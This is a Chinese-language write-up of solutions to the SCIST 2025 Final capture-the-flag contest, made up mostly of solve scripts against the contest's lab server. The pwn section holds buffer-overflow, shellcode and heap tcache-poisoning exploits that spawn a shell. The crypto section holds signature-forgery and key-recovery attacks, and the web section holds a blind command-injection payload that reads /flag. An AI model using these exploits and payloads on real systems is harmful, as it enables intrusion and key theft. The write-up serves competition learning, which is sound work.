
# SCIST 2025 Final



## 🧩 前言

這次的比賽不小心拿到 **第 5 名**（公開組第 2），真的滿意外的，主要是 **運氣好到爆炸**。
除了 `dig waf5` 沒打出來有一點小遺憾之外，其他能力範圍內的題目幾乎都有解出來。

幹話說到這裡接下來就跟我一起坐牢吧。

---

##  Reverse

###  Checker101

```python
path = '/mnt/data/Checker101'

with open(path, 'rb') as f:
    rodata_vma = 0x1000240
    rodata_offset_file = 0x240
    data_vaddr = 0x1021c00
    offset = rodata_offset_file + (data_vaddr - rodata_vma)
    
    f.seek(offset)
    data = f.read(0x3c)
    raw = data.split(b'\x00', 1)[0]

    rev = bytes([b ^ 7 for b in raw])
    flag = rev[::-1]

    print("rev:         ", rev)
    print("rev decoded: ", rev.decode('ascii'))
    print("flag:        ", flag.decode('ascii'))
```

> ✅ 利用 ELF 資訊計算 offset，定位資料後 XOR + reverse 還原 flag。
> 🧠 蠻直觀的處理流程，但要小心 address 與 offset 的換算。

---

### 🐱 Neko Identification System

```python
a = [
    0x54, 0x61, 0x6d, 0x61, 0x6b, 0x69, 0x20, 0x4b, 0x6f, 0x74,
    0x61, 0x74, 0x73, 0x75
]
b = [
    0xdd, 0x31, 0x23, 0x26, 0x66, 0x63, ...
]

def xor_restore(a, b):
    restored = bytearray()
    for i in range(len(b)):
        restored_byte = b[i] ^ a[i % len(a)]
        restored.append(restored_byte)
    return restored

def main():
    restored = xor_restore(a, b)
    hex_output = restored.hex()
    with open("rev.hex", "w") as f:
        f.write(hex_output)

if __name__ == "__main__":
    main()
```

>  `a` 是重複 key，`b` 是加密後資料，整體是經典的 XOR 循環加密
>  解出來的 rev.hex 是圖片檔，用命令轉回來：

```bash
xxd -r -p rev.hex > rev.png
eog rev.png
```


---

##  Pwn



###  Checkin

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

target_addr = 0x401955
ret_addr = 0x40101a
offset = 40

p = remote('lab.scist.org', 31606)
p.recv()

payload = b'A' * offset + p64(ret_addr) + p64(target_addr)
p.sendline(payload)

p.interactive()
```

---

###  Return to shellcode 2015

```python
#!/usr/bin/env python3
from pwn import *
import time

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

# p = process('./chal')
p = remote('lab.scist.org', 31607)

jmp_rax = 0x4010ac

# Stage 1 shellcode: read shellcode from stdin
loader = asm("""
    xor edi, edi
    mov rsi, rsp
    mov edx, 0x40
    xor eax, eax
    syscall
    jmp rsp
""")

payload1 = loader + p64(jmp_rax)
assert len(payload1) == 24

log.info("Sending stage 1")
p.send(payload1[:23])
time.sleep(0.5)

log.info("Sending stage 2")
payload2 = asm(shellcraft.sh())
p.send(payload2)

p.interactive()
```

---

###  Zero to Hero - Nerf Version 2

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
r = remote('lab.scist.org', 31608)

# === Helper Functions ===
def get_power(size, description):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', str(size).encode())
    r.sendlineafter(b'> ', description)

def remove_power(index):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', str(index).encode())

def print_power(index):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', str(index).encode())
    r.recvuntil(b'superpower is: ')
    return r.recvline().strip()

def update_power(index, description):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'> ', str(index).encode())
    r.sendlineafter(b'> ', description)

# === Exploitation Flow ===
log.info("Starting the challenge...")
r.recvuntil(b'hero?\n')
r.sendline(b'y')

log.info("Step 1: Leak libc address")
get_power(0x428, b'A' * 8)     # Chunk 0
get_power(0x28, b'guard')      # Chunk 1
remove_power(0)
leak_data = print_power(0)
leak_addr = u64(leak_data.ljust(8, b'\x00'))
log.success(f"Leaked main_arena address: {hex(leak_addr)}")

libc_base = leak_addr - (libc.symbols['__malloc_hook'] + 0x70)
log.success(f"Calculated libc base address: {hex(libc_base)}")

free_hook_addr = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
log.info(f"__free_hook address: {hex(free_hook_addr)}")
log.info(f"system() address: {hex(system_addr)}")

log.info("Step 2: Tcache Poisoning")
get_power(0x38, b'B' * 8)  # Chunk 2
get_power(0x38, b'C' * 8)  # Chunk 3
remove_power(2)
remove_power(3)

log.info(f"Overwriting freed chunk's fd (index 3) to point to __free_hook")
update_power(3, p64(free_hook_addr))

log.info("Step 3: Overwrite __free_hook with system")
get_power(0x38, b'D' * 8)           # Chunk 4 (dummy)
get_power(0x38, p64(system_addr))  # Chunk 5 -> __free_hook

log.info("Step 4: Trigger free('/bin/sh')")
get_power(0x18, b'/bin/sh\x00')  # Chunk 6
remove_power(6)

log.success("Shell popped! Switching to interactive mode.")
r.interactive()
```

---

## Crypto


### owo
```
from pwn import remote
from Crypto.Util.number import bytes_to_long, long_to_bytes
import gmpy2

host = "lab.scist.org"
port = 31611
r = remote(host, port)

owo_values = []
for _ in range(10):
    r.sendline(b'ff' * 64)
    response = r.recvline().decode().strip()
    hex_output = response.split('= ')[1]
    owo_k_bytes = bytes.fromhex(hex_output)
    owo_k = bytes_to_long(owo_k_bytes)
    owo_values.append(owo_k)

t_values = []
for k in range(7):
    t_k = ((owo_values[k+3] - owo_values[k+2]) * (owo_values[k+1] - owo_values[k]) -
           (owo_values[k+2] - owo_values[k+1])**2)
    t_values.append(t_k)

m = t_values[0]
for t in t_values[1:]:
    m = gmpy2.gcd(m, t)

if m < 0:
    m = -m

x1, x2, x3 = owo_values[0], owo_values[1], owo_values[2]
a = (x3 - x2) * gmpy2.invert(x2 - x1, m) % m
c = (x2 - a * x1) % m

x_k = owo_values[0]
a_inv = gmpy2.invert(a, m)
for _ in range(101):
    x_k = (x_k - c) * a_inv % m

flag_bytes = long_to_bytes(x_k)
try:
    flag = flag_bytes.decode('utf-8')
    print(f"FLAG: {flag}")
except UnicodeDecodeError:
    print(f"FLAG in bytes: {flag_bytes.hex()}")

r.close()

```
### Yoshino's Secret Plus
```
#!/usr/bin/env python3
from pwn import *
import time

context.log_level = 'warn'

def run_exploit():
    r = None
    try:
        HOST = 'lab.scist.org'
        PORT = 31609
        r = remote(HOST, PORT)

        r.recvuntil(b'token: ')
        token_hex = r.recvline().strip().decode()
        token_bytes = bytes.fromhex(token_hex)

        iv_orig = token_bytes[:16]
        ciphertext_orig = token_bytes[16:]

        BIT_FLIP_INDEX = 39
        xor_mask_admin = ord('0') ^ ord('1')

        cipher_list = list(ciphertext_orig)
        cipher_list[BIT_FLIP_INDEX] ^= xor_mask_admin
        ciphertext_new = bytes(cipher_list)

        r.recvuntil(b'OTP: ')
        otp_str = r.recvline().strip().decode()

        p0_orig_otp = b'12345678'
        p0_new_otp = otp_str.zfill(8).encode()
        iv_xor_mask = xor(p0_orig_otp, p0_new_otp)
        full_iv_mask = b'\x00' * 4 + iv_xor_mask + b'\x00' * (16 - 4 - len(iv_xor_mask))
        iv_new = xor(iv_orig, full_iv_mask)

        final_token_bytes = iv_new + ciphertext_new
        final_token_hex = final_token_bytes.hex()

        r.sendlineafter(b'token > ', final_token_hex.encode())

        response = r.recvall(timeout=2).decode()
        if 'FLAG' in response or 'flag' in response:
            print(response)
            return True
        return False

    except:
        return False
    finally:
        if r:
            r.close()

if __name__ == '__main__':
    attempts = 0
    while True:
        attempts += 1
        if run_exploit():
            break
        time.sleep(0.5)
```

### RSA SigSig

```
#!/usr/bin/env python3
from pwn import *
from Crypto.Util.number import bytes_to_long, GCD
import random

def solve():
    r = remote('lab.scist.org', 31613)

    r.recvuntil(b'pkey = ')
    pkey_ex = int(r.recvline().strip())
    r.recvuntil(b'skey = ')
    skey_ex = int(r.recvline().strip())
    r.recvuntil(b'n = ')
    n = int(r.recvline().strip())

    log.info(f"Received n = {n}")
    log.info(f"Received pkey_ex = {pkey_ex}")
    log.info(f"Received skey_ex = {skey_ex}")

    skey_bit_length = skey_ex.bit_length()
    half = skey_bit_length // 2
    left_part = skey_ex >> half
    right_part = skey_ex & ((1 << half) - 1)
    exponent_ex = left_part * right_part
    M = pkey_ex * exponent_ex - 1

    t = M
    while t % 2 == 0:
        t //= 2

    p, q = 0, 0
    while p == 0:
        g = random.randint(2, n - 2)
        y = pow(g, t, n)
        if y == 1 or y == n - 1:
            continue
        x = y
        while y != 1:
            x = y
            y = pow(y, 2, n)
            if y == n - 1:
                break
        if y == 1:
            p = GCD(x - 1, n)
            if p != 1 and p != n:
                q = n // p
                assert p * q == n

    log.success("Factored n!")
    log.info(f"p = {p}")
    log.info(f"q = {q}")

    phi_n = (p - 1) * (q - 1)
    log.success(f"Calculated phi(n) = {phi_n}")

    message_to_sign = b'give_me_flag'
    m = bytes_to_long(message_to_sign)

    for i in range(100):
        try:
            log.info(f"--- Round {i + 1} ---")
            r.recvuntil(b'pkey = ')
            pkey_round = int(r.recvline().strip())
            log.info(f"Received new pkey = {pkey_round}")

            signature = 0
            try:
                d_round = pow(pkey_round, -1, phi_n)
                target = m ^ pkey_round
                signature = pow(target, d_round, n)
                log.success(f"Successfully forged signature: {signature}")
            except ValueError:
                log.warning(f"pkey {pkey_round} is not invertible. Sending dummy signature.")

            r.sendlineafter(b'signature : ', str(signature).encode())
            response = r.recvline()
            if b'FLAG' in response or b'success' in response:
                log.success("Success! FLAG may have been received.")
                print("\n" + "="*20 + " SERVER RESPONSE " + "="*20)
                print(response.decode().strip())
                try:
                    next_line = r.recvline(timeout=2).decode().strip()
                    print(next_line)
                    print("="*59 + "\n")
                except EOFError:
                    pass
                break
            elif b'failed' in response:
                log.info(f"Round {i+1} failed as expected, continuing...")
            else:
                log.warning(f"Unexpected server response: {response.decode().strip()}")
        except EOFError:
            log.error("Connection closed by server.")
            break
        except Exception as e:
            log.error(f"An unexpected error occurred in round {i+1}: {e}")
            break

    r.close()

if __name__ == "__main__":
    solve()

```
### dsaaaaaaaaaaaaaaaaa
```
#!/usr/bin/env python3
from pwn import remote
from hashlib import sha1
from Crypto.Util.number import bytes_to_long, inverse

def H(m, q):
    return bytes_to_long(sha1(m).digest()) % q

def exploit():
    r = remote('lab.scist.org', 31612)
    r.recvuntil(b"p = ")
    p = int(r.recvline().strip())
    r.recvuntil(b"q = ")
    q = int(r.recvline().strip())
    r.recvuntil(b"g = ")
    g = int(r.recvline().strip())
    r.recvuntil(b"y = ")
    y = int(r.recvline().strip())

    r.recvuntil(b"> ")
    r.sendline(b"E")
    r.sendline(b"A")
    r.recvuntil(b"r = ")
    r0 = int(r.recvline().strip())
    r.recvuntil(b"s = ")
    s0 = int(r.recvline().strip())

    for _ in range(1, 6):
        r.recvuntil(b"> ")
        r.sendline(b"E")
        r.sendline(b"A")
        r.recvuntil(b"s = ")
        r.recvline()

    r.recvuntil(b"> ")
    r.sendline(b"E")
    r.sendline(b"I")
    r.recvuntil(b"r = ")
    r6 = int(r.recvline().strip())
    r.recvuntil(b"s = ")
    s6 = int(r.recvline().strip())

    assert r0 == r6

    H1 = H(b'AyachiNene', q)
    H2 = H(b'InabaMeguru', q)
    K = (H1 - H2) * inverse((s0 - s6) % q, q) % q
    x = (s0 * K - H1) * inverse(r0, q) % q

    Hf = H(b'GET_FLAG', q)
    rf = pow(g, K, p) % q
    sf = (inverse(K, q) * (Hf + x * rf)) % q

    r.recvuntil(b"> ")
    r.sendline(b"G")
    r.recvuntil(b"r: ")
    r.sendline(str(rf).encode())
    r.recvuntil(b"s: ")
    r.sendline(str(sf).encode())

    print(r.recvline(timeout=2).decode().strip())

if __name__ == "__main__":
    exploit()
```
---

## WEB


###  dig-blind2
```
import requests
import time
import string

URL = "http://lab.scist.org:31601/"
MAX_LEN = 50
DELAY_THRESHOLD = 5

charset = string.ascii_letters + string.digits + '_{}-!@#$%^&*()'

def test_char(position, char, known_prefix):
    length = position
    target_str = known_prefix + char
    payload = f"'; head -c{length} /flag | grep -qxF {target_str} && sleep 100; #"
    return payload

def main():
    known = ""
    session = requests.Session()

    for pos in range(1, MAX_LEN + 1):
        found = False
        for c in charset:
            payload = test_char(pos, c, known)
            data = {'name': payload}

            start = time.time()
            try:
                r = session.post(URL, data=data, timeout=DELAY_THRESHOLD + 10)
            except requests.exceptions.Timeout:
                known += c
                found = True
                break
            end = time.time()

            if end - start > DELAY_THRESHOLD:
                known += c
                found = True
                break

        if not found:
            break

    print(f"Flag guessed: {known}")

if __name__ == "__main__":
    main()
```


---

## MISC


### MIT license

```
import socket
import time

HOST = 'lab.scist.org'
PORT = 31603

SOURCE_ATTR = '_MIT__flag'
TARGET_ATTR = '_Printer__filenames'

def read_until(sock, delimiter_str):
    delimiter = delimiter_str.encode()
    buffer = b''
    while not buffer.endswith(delimiter):
        try:
            byte = sock.recv(1)
            if not byte:
                break
            buffer += byte
        except socket.timeout:
            break
    return buffer.decode(errors='ignore')

def solve():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(5)
        sock.connect((HOST, PORT))

        read_until(sock, 'Enter code: ')
        sock.sendall(b'patch\n')
        read_until(sock, 'src: ')
        sock.sendall(f"{TARGET_ATTR}\n".encode())
        read_until(sock, 'dst: ')
        sock.sendall(f"{SOURCE_ATTR}\n".encode())
        read_until(sock, 'Enter code: ')
        sock.sendall(b'license\n')

        full_response = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                full_response += chunk
            except socket.timeout:
                break

        text = full_response.decode(errors='ignore')
        print(text)

if __name__ == '__main__':
    solve()

```

### FLAG POEM 📜
幹這題就真的通靈
我一開始先猜xxd但解出來是沒東西
但是我發現裡面很多tab我就懷疑裡面有東西
查到是用stegsnow
後面跑去找了一個爆破工具
接著迷幻的來了
`python stegsnowbruteforcer.py --file flag.txt --wordlist /rockyou.txt --keyword SCIST{ --output results.txt`
跑下去
由於電腦破我就跑了一個小時
我猜可能不是用這個密碼本(太難爆破了)
我就各種語文理解文章
結果我後面看到提示
突然猜不會16是密碼長度吧
我就切
然後跑
蹦 flag跑出來了
這要是這樣就算了
結果第一個破這題的
他因為電腦好直接跑出來了(沒有切)
我整個emo了
我還是去我的國文考卷作閱讀理解吧sad
就這樣這次的題目writeup到這裡
謝謝大家

